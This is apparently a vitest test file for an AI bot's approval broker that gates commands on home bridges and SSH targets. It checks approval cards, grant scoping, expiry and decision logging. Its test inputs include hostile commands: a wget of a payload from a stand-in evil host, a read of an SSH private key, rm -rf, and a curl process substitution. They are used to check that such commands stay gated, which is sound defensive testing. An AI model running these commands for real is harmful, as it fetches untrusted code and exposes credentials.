// Home-bridge / SSH execution is a trust boundary: a missing scoped grant
// must raise a real pending card, never a 403 that pretends a card was shown.
// These tests pin the broker's lifecycle — resolved bridge identity, shared
// execution, abort-on-disconnect, owner-bound respond, expiry outcome,
// always-allow program scope, auto-mode denial, and the decision log.
import { rmSync } from "node:fs";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

import { approvalKey } from "./auto-approve.ts";
import {
  cancelBridgeApprovalsFor,
  cancelBridgeApprovalsForThread,
  dismissStaleBridgeCards,
  requestBridgeApproval,
  resetBridgeApprovalsForTests,
  resolveBridgeApproval,
  type ApprovalBus,
} from "./bridge-approval.ts";
import { DATA_DIR } from "./config.ts";
import type { ModelSelection } from "./contracts.ts";
import { appendDecision, flushDecisionLog, readDecisions } from "./decision-log.ts";
import { closeMessageDb } from "./message-db.ts";
import { Store, type BotRecord } from "./store.ts";

const selection = (): ModelSelection => ({ instanceId: "claude", model: "fake-model" });

function pendingCard(store: Store, bot: BotRecord) {
  return store
    .messagesFor(bot.threadId)
    .find((m) => m.kind === "options" && m.card?.requestId && !m.card.answered && !m.card.dismissed);
}

function pendingCards(store: Store, bot: BotRecord) {
  return store
    .messagesFor(bot.threadId)
    .filter((m) => m.kind === "options" && m.card?.requestId && !m.card.answered && !m.card.dismissed);
}

async function decisions() {
  await flushDecisionLog(DATA_DIR);
  return readDecisions(DATA_DIR, 200);
}

describe("bridge approval card lifecycle", () => {
  let store: Store;
  let bus: ApprovalBus;
  let bot: BotRecord;
  let execute: ReturnType<typeof vi.fn<( ) => Promise<{ ok: true }>>>;

  beforeEach(() => {
    resetBridgeApprovalsForTests();
    store = new Store(selection);
    bot = store.patchBot(store.createBot().id, { name: "Worker" })!;
    bus = { store, broadcast: () => {} };
    execute = vi.fn(async () => ({ ok: true as const }));
  });

  afterEach(() => {
    resetBridgeApprovalsForTests();
    closeMessageDb();
    rmSync(DATA_DIR, { recursive: true, force: true });
  });

  const ownerOf = (who: BotRecord = bot) => ({ botId: who.id, threadId: who.threadId });

  const shellReq = (overrides: Record<string, unknown> = {}) => ({
    bot,
    tool: "run_on_bridge" as const,
    command: "echo hi",
    bridgeId: "br-mini",
    bridgeName: "mini",
    execute,
    ...overrides,
  });

  it("creates a real pending card bound to the resolved bridge id and a narrow program allowKey", async () => {
    const verdict = requestBridgeApproval(bus, shellReq());
    const card = pendingCard(store, bot);
    expect(card).toBeTruthy();
    expect(card!.card!.tool).toBe("run_on_bridge");
    expect(card!.card!.allowKey).toBe("bridge:run_on_bridge:echo");
    expect(card!.card!.allowKey).toBe(approvalKey("run_on_bridge", "echo hi", "bridge"));
    expect(card!.card!.options).toEqual(["Allow", "Deny", "Always allow"]);
    expect(card!.card!.subtitle).toBe("echo hi");
    expect(card!.card!.title).toBe("Worker needs your approval");
    expect(card!.card!.actionSummary).toBe("Run a read-only command on mini");
    expect(card!.card!.alwaysAllowSummary).toBe("Always allow Terminal to run echo commands on mini.");
    expect(card!.card!.title).not.toContain("br-mini");

    expect(resolveBridgeApproval(bus, card!.card!.requestId!, "allow", ownerOf())).toEqual({
      handled: true,
      outcome: "allowed-once",
    });
    await expect(verdict).resolves.toEqual({ outcome: "allow", result: { ok: true } });
    expect(execute).toHaveBeenCalledTimes(1);
    expect(pendingCard(store, bot)).toBeUndefined();
  });

  it("puts the card on the bot thread so the existing phone always-allow path can see it", async () => {
    const verdict = requestBridgeApproval(bus, {
      bot,
      tool: "run_on_ssh_target",
      command: "uptime",
      bridgeId: "br-mini",
      bridgeName: "mini",
      sshAlias: "nas",
      logThreadId: "some-other-thread",
      execute,
    });
    const card = pendingCard(store, bot);
    expect(card).toBeTruthy();
    expect(card!.card!.tool).toBe("run_on_ssh_target");
    expect(card!.card!.allowKey).toBe("bridge:run_on_ssh_target:uptime");
    expect(card!.card!.title).toBe("Worker needs your approval");
    expect(card!.card!.actionSummary).toBe("Run a command on SSH target nas");
    expect(card!.card!.actionSummary).not.toContain("read-only");
    expect(card!.card!.alwaysAllowSummary).toBe("Always allow Terminal to run uptime commands on SSH target nas.");
    expect(card!.card!.title).not.toContain("br-mini");
    expect(store.messagesFor("some-other-thread")).toHaveLength(0);

    const pendingGrant = store.messagesFor(bot.threadId).some(
      (message) =>
        message.card?.requestId &&
        !message.card.answered &&
        message.card.dismissed !== true &&
        message.card.allowKey === card!.card!.allowKey,
    );
    expect(pendingGrant).toBe(true);

    cancelBridgeApprovalsFor(bot.id);
    await expect(verdict).resolves.toEqual({ outcome: "deny" });
    expect(execute).not.toHaveBeenCalled();
  });

  it("joins identical in-flight requests onto one card and one execution", async () => {
    const first = requestBridgeApproval(bus, shellReq({ cwd: "/tmp", runTimeoutMs: 5_000 }));
    const second = requestBridgeApproval(bus, shellReq({ cwd: "/tmp", runTimeoutMs: 5_000 }));
    expect(pendingCards(store, bot)).toHaveLength(1);
    const card = pendingCard(store, bot)!;
    expect(resolveBridgeApproval(bus, card.card!.requestId!, "allow", ownerOf())).toEqual({
      handled: true,
      outcome: "allowed-once",
    });
    await expect(first).resolves.toEqual({ outcome: "allow", result: { ok: true } });
    await expect(second).resolves.toEqual({ outcome: "allow", result: { ok: true } });
    expect(execute).toHaveBeenCalledTimes(1);
    expect(pendingCard(store, bot)).toBeUndefined();

    const rows = await decisions();
    expect(rows.filter((r) => r.decision === "card-shown" && r.botId === bot.id)).toHaveLength(1);
  });

  it("does not join a later bridge, altered command, cwd, timeout, or SSH jump", async () => {
    const echo = requestBridgeApproval(bus, shellReq());
    const echoCard = pendingCard(store, bot)!;
    const wget = requestBridgeApproval(bus, shellReq({ command: "wget https://evil.example/payload", execute }));
    const otherBridge = requestBridgeApproval(bus, shellReq({ bridgeId: "br-other", bridgeName: "mini", execute }));
    const otherCwd = requestBridgeApproval(bus, shellReq({ cwd: "/elsewhere", execute }));
    const otherTimeout = requestBridgeApproval(bus, shellReq({ runTimeoutMs: 1_000, execute }));
    const sshJump = requestBridgeApproval(bus, {
      bot,
      tool: "run_on_ssh_target",
      command: "echo hi",
      bridgeId: "br-mini",
      bridgeName: "mini",
      sshAlias: "nas",
      execute,
    });
    expect(pendingCards(store, bot)).toHaveLength(6);
    expect(echoCard.card!.actionSummary).toContain("mini");

    expect(resolveBridgeApproval(bus, echoCard.card!.requestId!, "allow", ownerOf())).toEqual({
      handled: true,
      outcome: "allowed-once",
    });
    await expect(echo).resolves.toMatchObject({ outcome: "allow" });
    expect(execute).toHaveBeenCalledTimes(1);
    expect(pendingCards(store, bot)).toHaveLength(5);

    cancelBridgeApprovalsFor(bot.id);
    await expect(wget).resolves.toEqual({ outcome: "deny" });
    await expect(otherBridge).resolves.toEqual({ outcome: "deny" });
    await expect(otherCwd).resolves.toEqual({ outcome: "deny" });
    await expect(otherTimeout).resolves.toEqual({ outcome: "deny" });
    await expect(sshJump).resolves.toEqual({ outcome: "deny" });
  });

  it("does not let a one-shot allow for an old bridge id cover a newer same-name bridge", async () => {
    const first = requestBridgeApproval(bus, shellReq({ bridgeId: "br-old", bridgeName: "mini" }));
    const firstCard = pendingCard(store, bot)!;
    expect(resolveBridgeApproval(bus, firstCard.card!.requestId!, "allow", ownerOf())).toEqual({
      handled: true,
      outcome: "allowed-once",
    });
    await expect(first).resolves.toMatchObject({ outcome: "allow" });

    const second = requestBridgeApproval(bus, shellReq({ bridgeId: "br-new", bridgeName: "mini", execute }));
    expect(pendingCard(store, bot)).toBeTruthy();
    expect(pendingCard(store, bot)!.card!.title).toBe("Worker needs your approval");
    cancelBridgeApprovalsFor(bot.id);
    await expect(second).resolves.toEqual({ outcome: "deny" });
    expect(execute).toHaveBeenCalledTimes(1);
  });

  it("denies an Allow that arrives after expiry and reports expired, never allowed-once", async () => {
    const verdict = requestBridgeApproval(bus, shellReq({ approvalTimeoutMs: 20 }));
    const card = pendingCard(store, bot)!;
    await expect(verdict).resolves.toEqual({ outcome: "expired" });
    expect(store.messagesFor(bot.threadId).find((m) => m.id === card.id)?.card?.answered).toBe("deny");
    expect(execute).not.toHaveBeenCalled();

    expect(resolveBridgeApproval(bus, card.card!.requestId!, "allow", ownerOf())).toEqual({
      handled: true,
      outcome: "expired",
    });
    const rows = await decisions();
    expect(rows.some((r) => r.requestId === card.card!.requestId && r.decision === "user-approved")).toBe(false);
  });

  it("consumes approve-once so a later Allow on the same requestId is rejected, not allowed-once", async () => {
    const first = requestBridgeApproval(bus, shellReq());
    const firstCard = pendingCard(store, bot)!;
    expect(resolveBridgeApproval(bus, firstCard.card!.requestId!, "allow", ownerOf())).toEqual({
      handled: true,
      outcome: "allowed-once",
    });
    await expect(first).resolves.toMatchObject({ outcome: "allow" });

    expect(resolveBridgeApproval(bus, firstCard.card!.requestId!, "allow", ownerOf())).toEqual({
      handled: true,
      outcome: "rejected",
    });

    const second = requestBridgeApproval(bus, shellReq({ execute }));
    const secondCard = pendingCard(store, bot);
    expect(secondCard).toBeTruthy();
    expect(secondCard!.card!.requestId).not.toBe(firstCard.card!.requestId);
    cancelBridgeApprovalsFor(bot.id);
    await expect(second).resolves.toEqual({ outcome: "deny" });
    expect(execute).toHaveBeenCalledTimes(1);
  });

  it("rejects a cross-bot or cross-thread respond without settling the owner's card", async () => {
    const other = store.patchBot(store.createBot().id, { name: "Impostor" })!;
    const verdict = requestBridgeApproval(bus, shellReq());
    const card = pendingCard(store, bot)!;
    expect(
      resolveBridgeApproval(bus, card.card!.requestId!, "allow", { botId: other.id, threadId: other.threadId }),
    ).toEqual({ handled: true, outcome: "forbidden" });
    expect(
      resolveBridgeApproval(bus, card.card!.requestId!, "allow", { botId: bot.id, threadId: other.threadId }),
    ).toEqual({ handled: true, outcome: "forbidden" });
    expect(pendingCard(store, bot)?.id).toBe(card.id);
    expect(execute).not.toHaveBeenCalled();

    expect(resolveBridgeApproval(bus, card.card!.requestId!, "allow", ownerOf())).toEqual({
      handled: true,
      outcome: "allowed-once",
    });
    await expect(verdict).resolves.toMatchObject({ outcome: "allow" });
  });

  it("aborts and denies when the requester disconnects, so a later Allow cannot run it", async () => {
    const ac = new AbortController();
    const verdict = requestBridgeApproval(bus, shellReq({ signal: ac.signal }));
    const card = pendingCard(store, bot)!;
    ac.abort();
    await expect(verdict).resolves.toEqual({ outcome: "deny" });
    expect(store.messagesFor(bot.threadId).find((m) => m.id === card.id)?.card?.answered).toBe("deny");
    expect(execute).not.toHaveBeenCalled();

    expect(resolveBridgeApproval(bus, card.card!.requestId!, "allow", ownerOf())).toEqual({
      handled: true,
      outcome: "rejected",
    });
    expect(execute).not.toHaveBeenCalled();
  });

  it("keeps a joined waiter alive when only one requester disconnects", async () => {
    const ac = new AbortController();
    const first = requestBridgeApproval(bus, shellReq({ signal: ac.signal }));
    const second = requestBridgeApproval(bus, shellReq());
    expect(pendingCards(store, bot)).toHaveLength(1);
    ac.abort();
    await expect(first).resolves.toEqual({ outcome: "deny" });
    const card = pendingCard(store, bot)!;
    expect(resolveBridgeApproval(bus, card.card!.requestId!, "allow", ownerOf())).toEqual({
      handled: true,
      outcome: "allowed-once",
    });
    await expect(second).resolves.toMatchObject({ outcome: "allow" });
    expect(execute).toHaveBeenCalledTimes(1);
  });

  it("honours a scoped always-allow grant without a card, and does not widen it to another program", async () => {
    store.patchBot(bot.id, { alwaysAllow: [approvalKey("run_on_bridge", "echo hi", "bridge")] });
    const live = store.bot(bot.id)!;

    await expect(requestBridgeApproval(bus, shellReq({ bot: live }))).resolves.toEqual({
      outcome: "allow",
      result: { ok: true },
    });
    expect(pendingCard(store, live)).toBeUndefined();

    await expect(requestBridgeApproval(bus, shellReq({ bot: live, command: "echo bye" }))).resolves.toMatchObject({
      outcome: "allow",
    });
    expect(pendingCard(store, live)).toBeUndefined();
    expect(execute).toHaveBeenCalledTimes(2);

    const wget = requestBridgeApproval(bus, shellReq({ bot: live, command: "wget https://example.com", execute }));
    const card = pendingCard(store, live);
    expect(card).toBeTruthy();
    expect(card!.card!.allowKey).toBe("bridge:run_on_bridge:wget");
    cancelBridgeApprovalsFor(live.id);
    await expect(wget).resolves.toEqual({ outcome: "deny" });
  });

  it("shares one execution for concurrent always-allow duplicates", async () => {
    store.patchBot(bot.id, { alwaysAllow: [approvalKey("run_on_bridge", "echo hi", "bridge")] });
    const live = store.bot(bot.id)!;
    const first = requestBridgeApproval(bus, shellReq({ bot: live }));
    const second = requestBridgeApproval(bus, shellReq({ bot: live }));
    await expect(Promise.all([first, second])).resolves.toEqual([
      { outcome: "allow", result: { ok: true } },
      { outcome: "allow", result: { ok: true } },
    ]);
    expect(execute).toHaveBeenCalledTimes(1);
    expect(pendingCard(store, live)).toBeUndefined();
  });

  it("does not let auto mode inherit a bridge approval", async () => {
    store.patchBot(bot.id, { autoApprove: true });
    const live = store.bot(bot.id)!;
    const verdict = requestBridgeApproval(bus, shellReq({ bot: live }));
    expect(pendingCard(store, live)).toBeTruthy();
    cancelBridgeApprovalsFor(live.id);
    await expect(verdict).resolves.toEqual({ outcome: "deny" });
    expect(execute).not.toHaveBeenCalled();
  });

  it("keeps destructive and sensitive commands fail-closed for grants, with no Always allow", async () => {
    store.patchBot(bot.id, {
      autoApprove: true,
      alwaysAllow: [approvalKey("run_on_bridge", "rm -rf /tmp/build", "bridge")],
    });
    const live = store.bot(bot.id)!;
    const destructive = requestBridgeApproval(
      bus,
      shellReq({ bot: live, command: "rm -rf /tmp/build" }),
    );
    const card = pendingCard(store, live);
    expect(card).toBeTruthy();
    expect(card!.card!.options).toEqual(["Allow", "Deny"]);
    expect(card!.card!.allowKey).toBeUndefined();

    expect(resolveBridgeApproval(bus, card!.card!.requestId!, "allow", ownerOf(live))).toEqual({
      handled: true,
      outcome: "allowed-once",
    });
    await expect(destructive).resolves.toMatchObject({ outcome: "allow" });

    const sensitive = requestBridgeApproval(
      bus,
      shellReq({ bot: live, command: "cat ~/.ssh/id_ed25519", execute }),
    );
    const sensitiveCard = pendingCard(store, live);
    expect(sensitiveCard).toBeTruthy();
    expect(sensitiveCard!.card!.options).toEqual(["Allow", "Deny"]);
    expect(sensitiveCard!.card!.allowKey).toBeUndefined();
    cancelBridgeApprovalsFor(live.id);
    await expect(sensitive).resolves.toEqual({ outcome: "deny" });
  });

  it("logs card-shown only when a card exists, then user-approved / user-denied accurately", async () => {
    const allow = requestBridgeApproval(bus, shellReq({ logThreadId: bot.threadId }));
    const allowCard = pendingCard(store, bot)!;
    let rows = await decisions();
    const shown = rows.filter((r) => r.decision === "card-shown" && r.requestId === allowCard.card!.requestId);
    expect(shown).toHaveLength(1);
    expect(shown[0]!.source).toBe("no-grant");
    expect(shown[0]!.tool).toBe("run_on_bridge");
    expect(shown[0]!.summary).toBe("echo hi");

    expect(resolveBridgeApproval(bus, allowCard.card!.requestId!, "allow", ownerOf())).toEqual({
      handled: true,
      outcome: "allowed-once",
    });
    await expect(allow).resolves.toMatchObject({ outcome: "allow" });
    rows = await decisions();
    const approved = rows.filter((r) => r.decision === "user-approved" && r.requestId === allowCard.card!.requestId);
    expect(approved).toHaveLength(1);
    expect(approved[0]!.source).toBe("user");

    const deny = requestBridgeApproval(bus, shellReq({ command: "ls /tmp", execute }));
    const denyCard = pendingCard(store, bot)!;
    expect(resolveBridgeApproval(bus, denyCard.card!.requestId!, "deny", ownerOf())).toEqual({
      handled: true,
      outcome: "rejected",
    });
    await expect(deny).resolves.toEqual({ outcome: "deny" });
    rows = await decisions();
    expect(rows.some((r) => r.decision === "user-denied" && r.requestId === denyCard.card!.requestId)).toBe(true);
  });

  it("logs auto-approved for a real always-allow grant and never a fake card-shown", async () => {
    store.patchBot(bot.id, { alwaysAllow: [approvalKey("run_on_bridge", "echo hi", "bridge")] });
    const live = store.bot(bot.id)!;
    await expect(requestBridgeApproval(bus, shellReq({ bot: live }))).resolves.toMatchObject({ outcome: "allow" });
    expect(pendingCard(store, live)).toBeUndefined();
    const rows = await decisions();
    const auto = rows.filter((r) => r.botId === live.id && r.decision === "auto-approved");
    expect(auto).toHaveLength(1);
    expect(auto[0]!.source).toBe("always-allow");
    expect(auto[0]!.rule).toBe("bridge:run_on_bridge:echo");
    expect(rows.some((r) => r.botId === live.id && r.decision === "card-shown")).toBe(false);
  });

  it("does not log card-shown when a request is refused without creating a card", async () => {
    appendDecision(DATA_DIR, {
      threadId: "unrelated",
      botId: "other",
      tool: "run_on_bridge",
      summary: "should not be confused with a missing-card 403",
      decision: "auto-approved",
      source: "always-allow",
    });
    const rows = await decisions();
    expect(rows.some((r) => r.decision === "card-shown")).toBe(false);
    expect(pendingCard(store, bot)).toBeUndefined();
  });

  it("answers an unknown requestId as not-ours, so provider cards still route", () => {
    expect(resolveBridgeApproval(bus, "not-a-bridge-request", "allow", ownerOf())).toEqual({ handled: false });
  });

  it("denies and settles when the bot is deleted or its thread is interrupted", async () => {
    const verdict = requestBridgeApproval(bus, shellReq());
    const card = pendingCard(store, bot)!;
    cancelBridgeApprovalsForThread(bot.threadId);
    await expect(verdict).resolves.toEqual({ outcome: "deny" });
    expect(store.messagesFor(bot.threadId).find((m) => m.id === card.id)?.card?.dismissed).toBe(true);
    expect(execute).not.toHaveBeenCalled();
  });

  it("dismisses cards left by a previous run, which nothing can answer", () => {
    const orphan = store.appendMessage(bot.threadId, {
      role: "bot",
      kind: "options",
      card: {
        title: "@Worker wants to run on mini [br-mini]",
        subtitle: "echo hi",
        options: ["Allow", "Deny", "Always allow"],
        requestId: "from-a-dead-process",
        tool: "run_on_bridge",
        allowKey: "bridge:run_on_bridge:echo",
      },
    });
    expect(dismissStaleBridgeCards(bus)).toBe(1);
    expect(store.messagesFor(bot.threadId).find((m) => m.id === orphan.id)?.card?.dismissed).toBe(true);
    expect(dismissStaleBridgeCards(bus)).toBe(0);
  });

  it("leaves a live card alone at boot", async () => {
    const verdict = requestBridgeApproval(bus, shellReq());
    expect(pendingCard(store, bot)).toBeTruthy();
    expect(dismissStaleBridgeCards(bus)).toBe(0);
    cancelBridgeApprovalsFor(bot.id);
    await expect(verdict).resolves.toEqual({ outcome: "deny" });
  });

  const OPENMAUSBOT_GIT_INSPECTION =
    "cd ~/Github/OpenMausBot 2>/dev/null && git log -5 --oneline --date=short --format='%h %ad %s' 2>/dev/null; echo '---'; git remote -v 2>/dev/null | head -2; echo '---'; ls -lt ~/Github/OpenMausBot 2>/dev/null | head -5";

  it("does not label an unknown bridge command as read-only", async () => {
    const verdict = requestBridgeApproval(bus, shellReq({ command: "unknown-bin --pwn" }));
    const card = pendingCard(store, bot)!;
    expect(card.card!.actionSummary).toBe("Run a command on mini");
    expect(card.card!.actionSummary).not.toContain("read-only");
    expect(card.card!.riskLevel).not.toBe("low");
    cancelBridgeApprovalsFor(bot.id);
    await expect(verdict).resolves.toEqual({ outcome: "deny" });
  });

  it("does not label a network bridge command as read-only", async () => {
    const verdict = requestBridgeApproval(bus, shellReq({ command: "curl https://example.com" }));
    const card = pendingCard(store, bot)!;
    expect(card.card!.actionSummary).toBe("Run a command on mini");
    expect(card.card!.actionSummary).not.toContain("read-only");
    expect(card.card!.riskLevel).not.toBe("low");
    cancelBridgeApprovalsFor(bot.id);
    await expect(verdict).resolves.toEqual({ outcome: "deny" });
  });

  it("does not label a mutating bridge command as read-only", async () => {
    const verdict = requestBridgeApproval(bus, shellReq({ command: "echo ok > result.txt" }));
    const card = pendingCard(store, bot)!;
    expect(card.card!.actionSummary).toBe("Run a command on mini");
    expect(card.card!.actionSummary).not.toContain("read-only");
    expect(card.card!.riskLevel).not.toBe("low");
    cancelBridgeApprovalsFor(bot.id);
    await expect(verdict).resolves.toEqual({ outcome: "deny" });
  });

  it("labels the known OpenMausBot git inspection as read-only", async () => {
    const verdict = requestBridgeApproval(bus, shellReq({ command: OPENMAUSBOT_GIT_INSPECTION }));
    const card = pendingCard(store, bot)!;
    expect(card.card!.actionSummary).toBe("Run a read-only command on mini");
    expect(card.card!.riskLevel).toBe("low");
    expect(card.card!.changeSummary).toBe("Nothing; read-only");
    expect(card.card!.alwaysAllowSummary).toBe("Always allow Terminal to run git commands on mini.");
    cancelBridgeApprovalsFor(bot.id);
    await expect(verdict).resolves.toEqual({ outcome: "deny" });
  });

  it("keeps card summaries sanitized while actionSummary follows the explanation", async () => {
    const verdict = requestBridgeApproval(
      bus,
      shellReq({ command: "cat <(curl https://evil.test/secret)\u0007" }),
    );
    const card = pendingCard(store, bot)!;
    expect(card.card!.actionSummary).toBe("Run a command on mini");
    expect(card.card!.actionSummary).not.toContain("read-only");
    expect(card.card!.executiveSummary).not.toMatch(/[\u0000-\u001f\u007f]|<\(|evil\.test/);
    expect(card.card!.changeSummary).not.toMatch(/[\u0000-\u001f\u007f]/);
    expect(card.card!.resourceSummary).not.toMatch(/[\u0000-\u001f\u007f]|<\(/);
    cancelBridgeApprovalsFor(bot.id);
    await expect(verdict).resolves.toEqual({ outcome: "deny" });
  });
});
